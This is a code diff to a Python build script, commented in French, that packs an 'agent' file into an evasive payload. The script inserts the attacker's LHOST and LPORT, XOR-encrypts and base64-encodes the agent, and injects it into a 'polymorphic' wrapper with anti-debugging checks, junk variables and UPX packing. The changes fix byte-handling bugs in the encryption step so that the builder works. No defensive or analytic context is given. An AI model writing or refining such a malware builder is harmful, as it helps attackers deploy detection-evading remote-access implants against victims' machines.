@@ -21,7 +21,7 @@ WRAPPER_TEMPLATE = os.path.join(BASE_DIR, "build", "template_wrapper.py")
 WRAPPER_OUTPUT = os.path.join(BASE_DIR, "build", "temp_wrapper.py")
 OUTPUT_DIR = os.path.join(BASE_DIR, "build", "output")
 ICON_DEFAULT = os.path.join(BASE_DIR, "assets", "win_ico.ico")
-UPX_PATH = r"C:\Tools\upx-5.0.2-win64\upx.exe"
+UPX_PATH = r"C:\\Tools\\upx-5.0.2-win64\\upx.exe"
 os.makedirs(OUTPUT_DIR, exist_ok=True)
 
 # ⚙️ Paramètres
@@ -32,15 +32,15 @@ RANDOM_DELAY = random.randint(3, 12)
 def random_string(length=10):
     return random.choice(string.ascii_letters) + ''.join(random.choices(string.ascii_letters + string.digits, k=length-1))
 
-def xor_encrypt(data, key):
-    return ''.join([chr(ord(c) ^ key) for c in data])
+def xor_encrypt(data: bytes, key: int) -> bytes:
+    return bytes([b ^ key for b in data])
 
 def polymorphic_wrapper(template: str) -> str:
     junk = "\n".join([f"{random_string(5)} = '{random_string(6)}'" for _ in range(10)])
     anti_dbg = "import sys\nif sys.gettrace(): exit()\n"
     return anti_dbg + "\n" + junk + "\n" + template
 
-def inject_wrapper(encoded_payload, xor_key):
+def inject_wrapper(encoded_payload: str, xor_key: int):
     with open(WRAPPER_TEMPLATE, "r", encoding="utf-8") as f:
         template = f.read()
     wrapper_final = template.replace("<ENCRYPTED_B64_PAYLOAD>", f'"{encoded_payload}"')
@@ -98,14 +98,14 @@ def main():
     with open(AGENT_FILE, "r", encoding="utf-8") as f:
         code = f.read()
 
-    # ✅ Remplacement dynamique LHOST / LPORT
     code = code.replace("LHOST_PLACEHOLDER", f'"{lhost}"')
     code = code.replace("LPORT_PLACEHOLDER", f"{lport}")
     print(f"[✔] Remplacement : LHOST={lhost}, LPORT={lport}")
 
     print("[*] Chiffrement XOR + base64...")
-    encrypted = xor_encrypt(code, XOR_KEY)
-    encoded = base64.b64encode(encrypted.encode()).decode()
+    agent_bytes = code.encode("utf-8")
+    encrypted_bytes = xor_encrypt(agent_bytes, XOR_KEY)
+    encoded = base64.b64encode(encrypted_bytes).decode("utf-8")
 
     print("[*] Injection du wrapper polymorphe...")
     inject_wrapper(encoded, XOR_KEY)
